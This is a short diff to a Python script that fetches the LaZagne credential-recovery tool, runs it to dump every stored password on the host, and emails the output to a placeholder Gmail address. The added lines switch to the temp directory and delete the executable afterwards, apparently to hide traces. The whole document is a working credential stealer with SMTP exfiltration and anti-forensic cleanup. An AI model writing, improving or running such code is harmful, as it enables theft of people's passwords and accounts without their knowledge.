@@ -3,6 +3,8 @@ import requests
 import subprocess
 import smtplib
 import re
+import os
+import tempfile
 
 
 def download(url):
@@ -20,7 +22,10 @@ def send_mail(email, password, message):
     server.quit()
 
 
+temp_dir = tempfile.gettempdir()
+os.chdir(temp_dir)
 download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")  # LaZagne
 
 result = subprocess.check_output("lazagne.exe all", shell=True)
 send_mail("youremail@gmail.com", "yourpassword", result)
+os.remove("lazagne.exe")
